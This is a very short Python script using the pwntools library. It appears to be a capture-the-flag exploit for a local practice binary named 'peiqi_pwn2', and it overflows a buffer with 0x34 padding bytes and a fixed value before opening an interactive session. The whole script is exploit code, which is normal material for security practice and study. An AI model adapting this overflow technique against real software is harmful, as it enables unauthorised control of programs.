from pwn import *
p = process('./peiqi_pwn2')
payload = 'a'*0x34+p32(0xabcdefab)
p.sendline(payload)
p.interactive()
